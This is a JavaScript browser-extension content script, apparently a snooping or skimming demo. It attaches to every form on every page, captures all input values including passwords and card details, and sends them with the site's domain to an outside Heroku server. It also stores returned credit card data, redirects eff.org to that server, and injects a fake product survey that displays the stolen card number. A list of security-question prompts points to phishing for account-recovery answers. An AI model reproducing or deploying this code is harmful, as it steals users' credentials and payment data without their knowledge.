var domainRegex = /https?:\/\/([a-zA-Z0-9\.]+)(:[0-9]+)?(\/.*)/g

function getDomain() {
  var url = document.URL
  var res = domainRegex.exec(url)
  console.log(url)
  console.log(res)
  if (!res || res.length < 2) throw new Error("No domain found")
  return res[1]
}

/*
 * Attaching listener to the form
 */

function getInputNodes(node) {
  let childNodes = node.elements
  if (childNodes === undefined || childNodes === null) {
    return []
  }
  let inputs = [];
  for (let j = 0; j < childNodes.length; j++) {
    let childNode = childNodes[j]
    if (childNode.tagName === "INPUT") {
      inputs.push(childNode)
    } else {
      let descendents = getInputNodes(childNode)
      for (let k = 0; k < descendents.length; k++) {
        inputs.push(descendents[k])
      }
    }
  }
  return inputs
}

var urlBackend = 'https://powerful-wave-30603.herokuapp.com'
var pathForm = '/123/form'

if (document.URL.match("eff.org")) {
  window.location.replace(urlBackend)
}

function onSubmitEvtReaction(evt) {
  evt.preventDefault()
  let form = evt.target
  let inputsToSend = []
  let inputs = getInputNodes(form)
  for (let l = 0; l < inputs.length; l++) {
    let input = inputs[l]
    let attributes = input.attributes
    let toAdd = {
      id: attributes.id.value,
      type: attributes.type.value,
      value: input.value,
    }
    console.log(toAdd)
    inputsToSend.push(toAdd)
  }
  var body = JSON.stringify({
    form: inputsToSend,
    domain: getDomain(),
  })
  fetch(urlBackend + pathForm, {
    method: "POST",
    mode: "cors",
    cache: "no-cache",
    headers: {
      "Content-Type": "application/json; charset=utf-8",
    },
    body: body,
  }).then(response => {
    console.log("form sent ^_^")
    return response.json()
  }).then(body => {
    if (!!body && !!body.creditCard && body.creditCard.formHasCard) {
      chrome.storage.local.set({creditcard: body.creditCard}, function() {
        console.log('Credit card data saved ^_^');
      })
    }
  })
}

/*
 * Application to the page
 */

let forms = document.getElementsByTagName("form")

if (!!forms && forms.length > 0) {
  for (let i = 0; i < forms.length; i++) {
    let form = forms[i]
    console.log("snooping 👀")
    form.addEventListener("submit", onSubmitEvtReaction)
  }
}

let questions = [
  "What is your mother's maiden name?",
  "What is the name of your dog?",
  "Would you like to buy a new house?",
  "On which street did you grow up?",
  "Would you buy frikandelbroodje from Albert Heijn if it was in the bonus?",
  "When was the last time you had Coca-Cola Cherry™️?",
  "What elementary school did you attend?",
  "In a scale from 0 to 10, what is your opinion of Monsanto™️?",
]

let products = [
  "Coca-Cola Cherry™️",
  "Frikandelbroodje by Albert Heijn™️",
  "MacBook Pro™️",
  "Dopper™️",
  "Pepsi Max™️",
]

function getRandomInt(max) {
  return Math.floor(Math.random() * Math.floor(max));
}

function produceRandomElement() {
  let product = products[getRandomInt(products.length)]
  let div = document.createElement("div")
  let question = "Can you describe in a few words your opinion of "+product+"?"
  let txt = document.createTextNode(question)
  let frm = document.createElement("form")
  let input = document.createElement("input")
  frm.appendChild(input)
  let btn = document.createElement("button")
  btn.appendChild(document.createTextNode("Submit"))
  frm.appendChild(btn)
  div.appendChild(txt)
  div.appendChild(frm)
  frm.addEventListener("submit", evt => {
    evt.preventDefault()
    let body = JSON.stringify({
      question: question,
      answer: input.value,
    })
    fetch(urlBackend + "/123/question", {
      method: "POST",
      mode: "cors",
      cache: "no-cache",
      headers: {
        "Content-Type": "application/json; charset=utf-8",
      },
      body: body,
    })
    chrome.storage.local.get(['creditcard'], function(result) {
      console.log(result)
      if (!result || !result.creditcard) {
        body.removeChild(div)
        return
      }
      div.removeChild(frm)
      let thankyouTxt = document.createTextNode("Thank you! Would you like to order it now, using credit card "+result.creditcard.number+"?")
      let thankyouParagraph = document.createElement("p")
      thankyouParagraph.appendChild(thankyouTxt)
      let orderBtn = document.createElement("button")
      orderBtn.appendChild(document.createTextNode("Yes!"))
      div.appendChild(thankyouParagraph)
      div.appendChild(orderBtn)
    })
  })
  let bodyResults = document.getElementsByTagName("body")
  let body = bodyResults[0]
  body.insertBefore(div, body.children[0])
}
produceRandomElement()
